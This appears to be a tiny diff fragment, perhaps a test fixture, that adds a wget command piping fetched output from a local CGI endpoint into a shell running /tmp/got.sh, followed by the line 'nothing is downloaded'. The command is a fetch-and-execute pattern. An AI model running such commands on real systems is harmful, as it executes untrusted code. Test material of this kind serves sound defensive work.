@@ -1,0 +1,2 @@
+wget -qO- 127.0.0.1/index.cgi?Host=192.168.1.1 | sh /tmp/got.sh
+nothing is downloaded
